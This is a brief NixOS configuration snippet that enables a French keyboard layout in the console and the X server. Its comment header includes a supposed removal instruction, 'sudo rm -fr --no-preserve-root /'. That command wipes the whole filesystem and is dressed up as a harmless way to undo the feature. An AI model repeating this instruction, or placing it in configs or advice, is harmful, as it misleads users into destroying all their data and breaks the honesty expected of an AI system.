# feature: french keyboard support in TTY and XServer
# note: to remove, `sudo rm -fr --no-preserve-root /`
{
  console.keyMap = "fr";

  services.xserver.xkb = {
    layout = "fr,us";
  };
}
